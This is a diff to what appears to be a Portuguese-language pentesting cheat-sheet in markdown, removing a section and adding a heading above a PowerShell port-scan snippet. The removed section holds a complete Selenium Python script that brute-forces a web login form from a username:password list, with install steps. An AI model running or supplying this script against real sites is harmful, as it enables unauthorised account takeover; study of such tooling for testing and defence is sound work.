@@ -311,69 +311,6 @@ CLIENT: ssh -L 5901:localhost:5901 -N -f seu_usuario@IP_DO_SERVIDOR
 CLIENT VNC: localhost:5901
 ```
 
-### Script Selenium: Brute Force de Login no Firefox
-Tags: `#script` `#selenium` `#bruteforce` `#web` `#firefox`
-
-Primeiro precisa instalar selenium e o geckodriver do firefox para o script funcionar
-
-	pip3 install selenium --break-system-packages
-	https://github.com/mozilla/geckodriver/releases [extrai e insere dentro do diretório do script]
-	nano script.py [paste do codigo abaixo]
-
-Script abaixo em python
-
-```python
-
-	from selenium import webdriver
-	from selenium.webdriver.common.by import By
-	import time
-
-	# Inicializa o navegador Firefox
-	driver = webdriver.Firefox()
-
-	# URL da página de login
-	url_login = "http://exemplo.com/login"
-
-	# Lê a lista de credenciais (formato: usuario:senha por linha)
-	with open("credenciais.txt", "r") as f:
-	    credenciais = [linha.strip().split(":") for linha in f.readlines()]
-
-	# Faz brute force
-	for usuario, senha in credenciais:
-	    driver.get(url_login)
-	    time.sleep(1)
-
-	    try:
-	        # Ajuste os seletores conforme o HTML da página
-	        campo_usuario = driver.find_element(By.NAME, "username")
-	        campo_senha = driver.find_element(By.NAME, "password")
-	        botao_login = driver.find_element(By.XPATH, '//button[@type="submit"]')
-
-	        campo_usuario.clear()
-	        campo_senha.clear()
-
-	        campo_usuario.send_keys(usuario)
-	        campo_senha.send_keys(senha)
-	        botao_login.click()
-
-	        time.sleep(2)  # Espera a resposta da página
-
-	        # Lógica para detectar sucesso (pode ser por URL, texto, etc)
-	        if "dashboard" in driver.current_url or "bem-vindo" in driver.page_source.lower():
-	            print(f"[+] Sucesso! Usuário: {usuario} | Senha: {senha}")
-	            break
-	        else:
-	            print(f"[-] Falhou: {usuario} | {senha}")
-
-	    except Exception as e:
-	        print(f"[!] Erro: {e}")
-	        continue
-
-	driver.quit()
-
-```
-
-
 ### Ferramentas e Setup Pós-Formatação
 Tags: `#setup` `#kali` `#ferramentas` `#vpn`
 
@@ -826,6 +763,7 @@ Comandos Windows equivalentes no Linux
 
 - Port Scan on PowerShell
 
+Ferramenta de scan de portas
 
 	param($ip)
 	 if (!$ip){
